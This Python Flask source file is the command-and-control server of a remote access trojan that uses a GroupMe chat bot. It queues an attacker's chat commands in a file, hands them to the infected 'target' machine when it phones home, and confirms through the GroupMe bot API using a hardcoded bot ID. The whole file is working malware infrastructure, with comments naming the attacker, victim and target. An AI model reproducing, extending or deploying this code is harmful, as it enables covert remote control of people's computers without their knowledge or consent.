# app.py		Receive POSTs, parse the payload data, do something with it.
# By: Bryton Herdes 
import os
import sys
import json

from urllib.parse import urlencode
from urllib.request import Request, urlopen
from flask import Response
from flask import Flask, request

app = Flask(__name__)

#What methods are we accepting and what URL
@app.route('/post', methods=['POST'])

def webhook():
  data = request.get_json()
  log('Recieved {}'.format(data))

  # We don't want to reply to ourselves! A infinite loop is a result if
  #bot replies to itself. Bot name = victim in this case.
  if data['name'] != 'victim':
    #Is the client/target sending this POST 
    if data['name'] == 'target':
       filecmd='commands.txt'
       file=open(filecmd, "r")
# Loop through here, sending one command at a time getting output back.
       cmd=file.read()
#       count=0
       data['text']=cmd
       js=json.dumps(data)
       log('Sent {}'.format(data))
       file.close()
       open('commands.txt', 'w').close()
       resp=Response(js, status=200, mimetype='application/json')
       return resp
#       exit()

# Display the help page if attacker types 'help'
    if data['text'] == 'help':
       msg = 'Welcome to RAT interface for GroupME'
       send_message(msg)

# Get command attacker sends. Write these commands to file until they are run. 
    else:
       cmd=data['text']
       filename='commands.txt'
       file=open(filename, "a+")
       file.write(cmd + ',')
#       file.write('\n')
       file.close()
       msg='Executing Command when target phones home next: '
       msg=msg+cmd
       send_message(msg)

def send_message(msg):
  url  = 'https://api.groupme.com/v3/bots/post'

  data = {
          'bot_id' : "688958bd70cfbf125a71291636",
          'text'   : msg,
         }
  request = Request(url, urlencode(data).encode())
  json = urlopen(request).read().decode()
  return 'ok', 200

def log(msg):
  print(str(msg))
  sys.stdout.flush()

